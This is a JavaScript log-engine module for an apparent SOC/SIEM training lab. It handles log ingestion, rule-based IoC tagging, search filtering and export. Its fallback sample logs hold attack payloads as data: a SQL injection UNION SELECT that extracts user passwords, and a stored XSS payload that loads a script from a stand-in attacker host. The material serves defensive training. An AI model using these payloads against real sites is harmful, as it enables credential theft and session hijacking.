/**
 * SOC SIEM Log Engine
 * Handles log ingestion, background traffic generation, search parsing, and export formatting.
 */

import { store } from './store.js';
import { inspectLogForIoCs } from './detections.js';
import { toApacheCombinedLog, formatApacheTimestamp } from './utils.js';

class LogEngine {
  constructor() {
    this.trafficInterval = null;
    this.syntheticCounter = 100;
  }

  async init() {
    // Check if we have logs saved in localStorage, else load baseline
    const saved = localStorage.getItem('soc_lab_logs_v1');
    if (saved) {
      try {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) {
          store.setLogs(parsed);
          return;
        }
      } catch (e) {
        console.warn('Failed to parse cached logs, loading baseline.', e);
      }
    }

    await this.resetToBaseline();
  }

  async resetToBaseline() {
    try {
      const response = await fetch('data/baseline-logs.json');
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const baselineLogs = await response.json();
      
      // Ensure all baseline logs have proper IoC analysis populated
      const inspected = baselineLogs.map(log => {
        const analysis = inspectLogForIoCs(log, baselineLogs);
        return {
          ...log,
          ...analysis,
          // Preserving any specific explicit manual overrides from baseline
          category: log.category || analysis.category,
          ioc_details: log.ioc_details || analysis.ioc_details
        };
      });

      store.setLogs(inspected);
    } catch (e) {
      console.error('Error loading baseline logs:', e);
      // Fallback minimal baseline if fetch fails (e.g. strict local file:// protocol)
      this.loadMinimalFallbackBaseline();
    }
  }

  loadMinimalFallbackBaseline() {
    const fallbackLogs = [
      {
        id: "log-001",
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        client_ip: "192.168.1.45",
        method: "GET",
        uri: "/",
        protocol: "HTTP/1.1",
        status: 200,
        bytes_sent: 4210,
        referer: "-",
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0",
        query_params: {},
        body: null,
        category: "legitimate",
        matched_rule: null,
        ioc_detected: false,
        ioc_details: null
      },
      {
        id: "log-002",
        timestamp: new Date(Date.now() - 3000000).toISOString(),
        client_ip: "198.51.100.44",
        method: "GET",
        uri: "/catalog/search",
        protocol: "HTTP/1.1",
        status: 500,
        bytes_sent: 1420,
        referer: "-",
        user_agent: "sqlmap/1.7.2#stable (https://sqlmap.org)",
        query_params: { "q": "-1' UNION SELECT 1,username,password,4,5 FROM users-- -" },
        body: null,
        category: "sqli",
        matched_rule: "RULE-SEC-001",
        ioc_detected: true,
        ioc_details: "SQL Injection UNION SELECT statement targeting users database."
      },
      {
        id: "log-003",
        timestamp: new Date(Date.now() - 1800000).toISOString(),
        client_ip: "203.0.113.89",
        method: "POST",
        uri: "/api/login",
        protocol: "HTTP/1.1",
        status: 401,
        bytes_sent: 520,
        referer: "http://portal.cybervault.local/login",
        user_agent: "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        query_params: {},
        body: "username=sarah_admin&password=123456&submit=Login",
        category: "brute_force",
        matched_rule: "RULE-SEC-004",
        ioc_detected: true,
        ioc_details: "Authentication failure (401) targeting account 'sarah_admin'."
      },
      {
        id: "log-004",
        timestamp: new Date(Date.now() - 600000).toISOString(),
        client_ip: "198.51.100.72",
        method: "POST",
        uri: "/board/feedback",
        protocol: "HTTP/1.1",
        status: 201,
        bytes_sent: 910,
        referer: "http://portal.cybervault.local/feedback",
        user_agent: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
        query_params: {},
        body: "author=security_auditor&comment=%3Cscript%20src%3D%22http%3A%2F%2Fevil-c2.attacker.com%2Fsteal%22%3E%3C%2Fscript%3E",
        category: "xss",
        matched_rule: "RULE-SEC-003",
        ioc_detected: true,
        ioc_details: "Stored XSS payload injected via POST comment parameter referencing remote malicious script."
      }
    ];

    const inspected = fallbackLogs.map(l => ({ ...l, ...inspectLogForIoCs(l, fallbackLogs) }));
    store.setLogs(inspected);
  }

  /**
   * Ingest a single log from the target web app or simulator
   */
  ingest(rawLog) {
    const id = `log-${Date.now().toString(36)}-${Math.random().toString(36).substr(2, 4)}`;
    const timestamp = rawLog.timestamp || new Date().toISOString();
    
    const preparedLog = {
      id,
      timestamp,
      client_ip: rawLog.client_ip || '127.0.0.1',
      method: rawLog.method || 'GET',
      uri: rawLog.uri || '/',
      protocol: rawLog.protocol || 'HTTP/1.1',
      status: rawLog.status || 200,
      bytes_sent: rawLog.bytes_sent || Math.floor(Math.random() * 4000 + 400),
      referer: rawLog.referer || '-',
      user_agent: rawLog.user_agent || navigator.userAgent,
      query_params: rawLog.query_params || {},
      body: rawLog.body || null
    };

    // Run SIEM rules
    const analysis = inspectLogForIoCs(preparedLog, store.logs);
    const finalizedLog = {
      ...preparedLog,
      ...analysis
    };

    store.addLog(finalizedLog);
    return finalizedLog;
  }

  /**
   * Filter logs based on search string and category
   */
  filterLogs(logs, searchQuery = '', category = 'all') {
    let result = [...logs];

    // Filter by quick category tab
    if (category && category !== 'all') {
      if (category === 'sqli') {
        result = result.filter(l => l.category === 'sqli' || (l.matched_rule && l.matched_rule.includes('001') || l.matched_rule?.includes('002')));
      } else if (category === 'xss') {
        result = result.filter(l => l.category === 'xss' || (l.matched_rule && l.matched_rule.includes('003')));
      } else if (category === 'brute_force') {
        result = result.filter(l => l.category === 'brute_force' || (l.matched_rule && l.matched_rule.includes('004')));
      } else if (category === 'alerts') {
        result = result.filter(l => l.ioc_detected === true);
      } else if (category === 'errors') {
        result = result.filter(l => l.status >= 400);
      }
    }

    // Filter by search query
    const q = searchQuery.trim();
    if (!q) return result;

    // Parse Lucene-like key:value expressions
    const fieldTokens = [];
    let freeText = q;

    const regex = /(\b[\w_]+)\s*:\s*("[^"]+"|[^\s]+)/g;
    let match;
    while ((match = regex.exec(q)) !== null) {
      fieldTokens.push({ field: match[1].toLowerCase(), value: match[2].replace(/^"|"$/g, '') });
      freeText = freeText.replace(match[0], '');
    }
    freeText = freeText.trim().toLowerCase();

    return result.filter(log => {
      // Check field tokens
      for (const token of fieldTokens) {
        const val = token.value.toLowerCase();
        switch (token.field) {
          case 'status':
            if (val.startsWith('!')) {
              if (String(log.status) === val.slice(1)) return false;
            } else {
              if (String(log.status) !== val) return false;
            }
            break;
          case 'ip':
          case 'client_ip':
            if (!log.client_ip.toLowerCase().includes(val)) return false;
            break;
          case 'method':
            if (log.method.toLowerCase() !== val) return false;
            break;
          case 'uri':
          case 'path':
            if (val.includes('*')) {
              const regexStr = val.replace(/\*/g, '.*');
              if (!new RegExp(regexStr, 'i').test(log.uri)) return false;
            } else if (!log.uri.toLowerCase().includes(val)) {
              return false;
            }
            break;
          case 'rule':
          case 'matched_rule':
            if (!log.matched_rule || !log.matched_rule.toLowerCase().includes(val)) return false;
            break;
          case 'category':
            if (!log.category || !log.category.toLowerCase().includes(val)) return false;
            break;
          case 'ioc':
            const boolVal = val === 'true';
            if (log.ioc_detected !== boolVal) return false;
            break;
          case 'severity':
            if (!log.severity || log.severity.toLowerCase() !== val) return false;
            break;
          default:
            // Custom field check
            const rawVal = JSON.stringify(log).toLowerCase();
            if (!rawVal.includes(`${token.field}`) || !rawVal.includes(val)) return false;
        }
      }

      // Check free-text
      if (freeText) {
        const logContent = [
          log.client_ip,
          log.uri,
          log.method,
          log.status,
          log.user_agent,
          log.category,
          log.ioc_details,
          log.body,
          JSON.stringify(log.query_params || {})
        ].filter(Boolean).join(' ').toLowerCase();

        if (!logContent.includes(freeText)) {
          return false;
        }
      }

      return true;
    });
  }

  /**
   * Generates a single benign synthetic background log
   */
  generateBenignLog() {
    const benignUsers = [
      { ip: '192.168.1.101', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36' },
      { ip: '192.168.1.102', ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15' },
      { ip: '10.0.0.15', ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15' },
      { ip: '172.16.2.88', ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0' }
    ];

    const benignEndpoints = [
      { uri: '/', method: 'GET', status: 200, query: {} },
      { uri: '/catalog', method: 'GET', status: 200, query: {} },
      { uri: '/catalog/search', method: 'GET', status: 200, query: { q: 'vpn router' } },
      { uri: '/catalog/search', method: 'GET', status: 200, query: { q: 'yubikey' } },
      { uri: '/board/feedback', method: 'GET', status: 200, query: {} },
      { uri: '/css/styles.css', method: 'GET', status: 200, query: {} },
      { uri: '/assets/logo.png', method: 'GET', status: 200, query: {} },
      { uri: '/api/status', method: 'GET', status: 200, query: {} }
    ];

    const user = benignUsers[Math.floor(Math.random() * benignUsers.length)];
    const ep = benignEndpoints[Math.floor(Math.random() * benignEndpoints.length)];

    return this.ingest({
      client_ip: user.ip,
      method: ep.method,
      uri: ep.uri,
      query_params: ep.query,
      status: ep.status,
      user_agent: user.ua,
      referer: 'http://portal.cybervault.local/',
      bytes_sent: Math.floor(Math.random() * 3500 + 400)
    });
  }

  /**
   * Export all currently stored logs as Apache Combined Log text
   */
  exportApacheLog() {
    return store.logs.map(toApacheCombinedLog).join('\n');
  }

  /**
   * Export logs as formatted JSON string
   */
  exportJSON() {
    return JSON.stringify(store.logs, null, 2);
  }

  /**
   * Export logs as CSV format
   */
  exportCSV() {
    const headers = ['Timestamp', 'Client_IP', 'Method', 'URI', 'Status', 'Bytes', 'Category', 'IoC_Detected', 'Rule', 'User_Agent'];
    const rows = store.logs.map(log => [
      `"${log.timestamp}"`,
      `"${log.client_ip}"`,
      `"${log.method}"`,
      `"${log.uri.replace(/"/g, '""')}"`,
      log.status,
      log.bytes_sent,
      `"${log.category || 'legitimate'}"`,
      log.ioc_detected ? 'TRUE' : 'FALSE',
      `"${log.matched_rule || ''}"`,
      `"${(log.user_agent || '').replace(/"/g, '""')}"`
    ].join(','));

    return [headers.join(','), ...rows].join('\n');
  }
}

export const logEngine = new LogEngine();
